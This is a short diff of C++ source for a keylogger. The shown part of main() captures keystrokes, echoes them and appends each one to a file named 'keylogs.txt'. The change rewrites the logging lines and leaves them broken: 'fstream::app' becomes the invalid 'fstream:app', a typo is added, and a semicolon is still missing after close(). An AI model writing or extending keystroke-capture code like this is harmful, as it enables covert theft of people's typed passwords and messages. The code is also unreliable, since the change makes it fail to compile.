@@ -46,6 +46,7 @@ bool KeyIsListed(int iKey){
 
     }
 }
+
 int main()
 {
     char key;
@@ -57,9 +58,9 @@ int main()
             if(KeyIsListed(key) == FALSE){
                 cout << key;
                 ofstream logfile;
-                logfile.open("keylogs.txt", fstream::app);
-                logfile << key; //write the key strikes in a file
-                logfile.close() //closes the log
+                logfile.open("keylogs.txt", fstream:app);
+                logfile << key; //write the key striks in a file
+                logfile.close() //close the log     
             }
         }
     }
